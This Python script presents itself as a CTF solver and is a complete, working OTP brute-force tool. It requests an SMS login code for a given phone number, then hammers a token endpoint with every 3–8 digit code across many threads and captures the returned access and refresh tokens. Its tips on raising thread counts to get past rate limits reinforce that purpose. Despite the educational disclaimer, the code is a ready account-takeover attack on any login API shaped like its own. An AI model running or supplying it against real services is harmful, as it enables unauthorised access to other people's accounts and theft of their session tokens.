#!/usr/bin/env python3
"""
CTF Web Challenge Solver - OTP Bruteforce Module
=================================================

For educational purposes and authorized CTF competitions only.

Features
--------
- Configurable OTP length (3-8 digits)
- Thread-safe HTTP with per-thread sessions and connection pooling
- Graceful shutdown via threading.Event
- CLI interface with argparse
- Real-time progress reporting
- Flag-pattern detection in responses

Usage
-----
    python ctf_otp_solver.py http://target:8080 --phone 09123456789
    python ctf_otp_solver.py http://target:8080 --phone 09123456789 --threads 100 --digits 6
"""

from __future__ import annotations

import argparse
import re
import sys
import threading
import time
from queue import Empty, Queue
from typing import Any, Dict, List, Optional

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Common CTF flag patterns
FLAG_PATTERNS: List[re.Pattern[str]] = [
    re.compile(r"(CTF\{[^}]+\})", re.IGNORECASE),
    re.compile(r"(FLAG\{[^}]+\})", re.IGNORECASE),
    re.compile(r"(flag\[[^\]]+\])"),
]


class CTFWebChallengeSolver:
    """Parallel OTP brute-forcer for CTF challenges."""

    def __init__(self, target_url: str = "http://localhost:8080", timeout: float = 8.0):
        self.target_base = target_url.rstrip("/")
        self.timeout = timeout
        self.http_headers = {
            "Content-Type": "application/json",
            "User-Agent": "CTF-Solver/1.0",
        }

        # Thread-safe shared state
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.challenge_results: Dict[str, Any] = {}
        self.start_time: Optional[float] = None
        self.total_requests = 0

    def _build_session(self, pool_size: int) -> requests.Session:
        """Build a requests.Session with retry logic and sized connection pool."""
        session = requests.Session()
        session.headers.update(self.http_headers)
        retry = Retry(
            total=1,
            connect=1,
            backoff_factor=0.1,
            allowed_methods=frozenset(["POST"]),
            raise_on_status=False,
        )
        adapter = HTTPAdapter(
            pool_connections=pool_size,
            pool_maxsize=pool_size,
            max_retries=retry,
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def request_otp(self, phone_number: str) -> Optional[str]:
        """Phase 1: Request OTP code from challenge endpoint.

        Returns the id_token needed for brute-force, or None on failure.
        """
        otp_endpoint = f"{self.target_base}/authorization/v1/auth/otp"
        payload = {
            "mobile": phone_number,
            "grant_type": "login_otp",
            "mfa_method": "sms",
        }

        print(f"[*] Sending OTP request for: {phone_number}")
        session = self._build_session(pool_size=1)
        try:
            resp = session.post(otp_endpoint, json=payload, timeout=self.timeout)
            if resp.status_code == 200:
                data = resp.json()
                id_token = data.get("id_token")
                if not id_token:
                    print("[-] Response 200 but no id_token in body.")
                    print(f"    Response: {resp.text[:200]}")
                    return None
                print("[+] ID token acquired. Starting OTP enumeration...")
                return id_token
            print(f"[-] OTP request failed (HTTP {resp.status_code})")
            print(f"    Response: {resp.text[:200]}")
            return None
        except requests.exceptions.ConnectionError as err:
            print(f"[-] Connection error (is the target reachable?): {err}")
            return None
        except requests.exceptions.Timeout:
            print(f"[-] Request timed out after {self.timeout}s")
            return None
        except requests.exceptions.RequestException as err:
            print(f"[-] Request error: {err}")
            return None
        finally:
            session.close()

    def _worker(
        self,
        id_token: str,
        otp_queue: Queue[str],
        pool_size: int,
    ) -> None:
        """Worker thread: pull OTP guesses from queue and verify them.

        Each worker owns its own requests.Session for thread safety.
        Stops when stop_event is set, queue is empty, or a valid OTP is found.
        """
        session = self._build_session(pool_size=pool_size)
        verify_endpoint = f"{self.target_base}/authorization/v1/auth/token"

        try:
            while not self.stop_event.is_set():
                try:
                    current_otp = otp_queue.get(timeout=0.5)
                except Empty:
                    break

                try:
                    payload = {
                        "id_token": id_token,
                        "otp": current_otp,
                        "grant_type": "login_otp",
                    }
                    resp = session.post(
                        verify_endpoint, json=payload, timeout=self.timeout
                    )

                    with self.lock:
                        self.total_requests += 1
                        count = self.total_requests

                    if count % 500 == 0:
                        elapsed = time.time() - (self.start_time or time.time())
                        rate = count / elapsed if elapsed > 0 else 0
                        print(f"[*] Progress: {count} guesses | {rate:.0f} req/s")

                    if resp.status_code == 200:
                        try:
                            token_data = resp.json()
                        except ValueError:
                            token_data = {}

                        self.stop_event.set()
                        with self.lock:
                            self.challenge_results = {
                                "valid_otp": current_otp,
                                "access_token": token_data.get("access_token"),
                                "refresh_token": token_data.get("refresh_token"),
                                "raw_response": resp.text[:1000],
                            }
                        print(f"\n[!!!] SUCCESS! Correct OTP: {current_otp}")
                        break

                except requests.exceptions.Timeout:
                    pass
                except requests.exceptions.ConnectionError:
                    time.sleep(0.2)
                except requests.exceptions.RequestException:
                    pass
                finally:
                    otp_queue.task_done()
        finally:
            session.close()

    def brute_force_parallel(
        self,
        id_token: str,
        thread_count: int = 60,
        otp_digits: int = 4,
        deadline_seconds: int = 110,
    ) -> bool:
        """Parallel OTP brute force with configurable digit length.

        Returns True if a valid OTP was found, False otherwise.
        """
        total = 10**otp_digits
        fmt = f"0{otp_digits}d"
        print(f"[*] Generating {total} OTP candidates ({0:{fmt}}-{total - 1:{fmt}})...")

        otp_queue: Queue[str] = Queue()
        for num in range(total):
            otp_queue.put(f"{num:{fmt}}")

        print(f"[*] Launching {thread_count} threads...")
        print(f"[*] Deadline: {deadline_seconds}s (set to slightly less than token expiry)")

        self.start_time = time.time()
        self.stop_event.clear()
        self.total_requests = 0
        self.challenge_results = {}

        workers: List[threading.Thread] = []
        for i in range(thread_count):
            t = threading.Thread(
                target=self._worker,
                args=(id_token, otp_queue, thread_count),
                daemon=True,
                name=f"otp-worker-{i}",
            )
            workers.append(t)
            t.start()

        last_status_time = 0.0
        while not self.stop_event.is_set():
            elapsed = time.time() - self.start_time
            if elapsed >= deadline_seconds:
                print(f"\n[-] Deadline reached ({deadline_seconds}s). Stopping...")
                self.stop_event.set()
                break

            alive = any(t.is_alive() for t in workers)
            if not alive:
                break

            now = time.time()
            if now - last_status_time >= 20:
                last_status_time = now
                remaining = int(deadline_seconds - elapsed)
                with self.lock:
                    count = self.total_requests
                rate = count / elapsed if elapsed > 0 else 0
                print(
                    f"[*] {remaining}s left | {count}/{total} tried | {rate:.0f} req/s"
                )
            time.sleep(1)

        for t in workers:
            t.join(timeout=3)

        elapsed_total = time.time() - self.start_time
        with self.lock:
            final_count = self.total_requests
        rate = final_count / elapsed_total if elapsed_total > 0 else 0
        print("\n[+] Statistics:")
        print(f"    Total requests: {final_count}")
        print(f"    Time taken:     {elapsed_total:.1f}s")
        print(f"    Average speed:  {rate:.0f} req/s")

        return bool(self.challenge_results)

    def extract_flag(self) -> None:
        """Print flag / token information from a successful result."""
        if not self.challenge_results:
            print("[-] No results to extract.")
            return

        otp = self.challenge_results.get("valid_otp")
        access = self.challenge_results.get("access_token")
        refresh = self.challenge_results.get("refresh_token")
        raw = self.challenge_results.get("raw_response", "")

        if otp:
            print(f"[+] Valid OTP:      {otp}")
        if access:
            print(f"[+] Access token:   {access[:120]}...")
        if refresh:
            print(f"[+] Refresh token:  {refresh[:120]}...")

        for pattern in FLAG_PATTERNS:
            match = pattern.search(raw)
            if match:
                print(f"\n[!!!] FLAG FOUND: {match.group(1)}")
                return

        print("\n[*] No flag pattern detected in response. Check tokens above.")
        if raw:
            print(f"[*] Raw response preview:\n    {raw[:300]}")

    def run_attack(
        self,
        phone: str,
        thread_count: int = 60,
        otp_digits: int = 4,
        deadline: int = 110,
    ) -> bool:
        """Full attack routine: request OTP → brute-force → extract flag.

        Returns True on success.
        """
        id_token = self.request_otp(phone)
        if not id_token:
            print("[-] Cannot retrieve ID token. Check target URL or headers.")
            return False

        success = self.brute_force_parallel(
            id_token,
            thread_count=thread_count,
            otp_digits=otp_digits,
            deadline_seconds=deadline,
        )

        if success:
            print("\n" + "=" * 60)
            print("[+] CHALLENGE SOLVED!")
            print("=" * 60)
            self.extract_flag()
        else:
            print("\n[-] Attack failed. Possible causes:")
            print(f"    - Wrong OTP length (tried {otp_digits} digits; use --digits 5 or 6)")
            print("    - Token expired too quickly (lower --deadline)")
            print("    - Rate limiting / CAPTCHA on server")
            print("    - Wrong endpoint or payload format")
            print("    - Not enough threads (increase --threads)")
        return success


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="ctf_otp_solver",
        description=(
            "CTF OTP Bruteforce Solver\n"
            "For authorized CTF competitions and educational use only."
        ),
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "url",
        nargs="?",
        default="http://localhost:8080",
        help="Target base URL (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--phone", "-p",
        help="Phone number to attack (skips interactive prompt if given)",
    )
    parser.add_argument(
        "--threads", "-T",
        type=int,
        default=60,
        help="Number of concurrent worker threads (default: 60)",
    )
    parser.add_argument(
        "--digits", "-d",
        type=int,
        default=4,
        choices=range(3, 9),
        metavar="3-8",
        help="OTP digit length (default: 4)",
    )
    parser.add_argument(
        "--deadline",
        type=int,
        default=110,
        help="Max seconds before giving up (default: 110)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=8.0,
        help="Per-request timeout in seconds (default: 8.0)",
    )
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if args.threads < 1:
        parser.error("--threads must be >= 1")
    if args.deadline < 1:
        parser.error("--deadline must be >= 1")

    solver = CTFWebChallengeSolver(target_url=args.url, timeout=args.timeout)

    print("=" * 60)
    print("CTF Web Challenge - OTP Bruteforce Solver")
    print("=" * 60)
    print(f"[*] Target:   {args.url}")
    print(f"[*] Threads:  {args.threads}")
    print(f"[*] Digits:   {args.digits}")
    print(f"[*] Deadline: {args.deadline}s")
    print("[!] Use only on targets you own or have explicit permission.\n")

    phone = args.phone
    if not phone:
        phone = input("[?] Enter phone number: ").strip()
        if not phone:
            print("[-] Phone number required.")
            sys.exit(1)

    solver.run_attack(
        phone=phone,
        thread_count=args.threads,
        otp_digits=args.digits,
        deadline=args.deadline,
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(130)
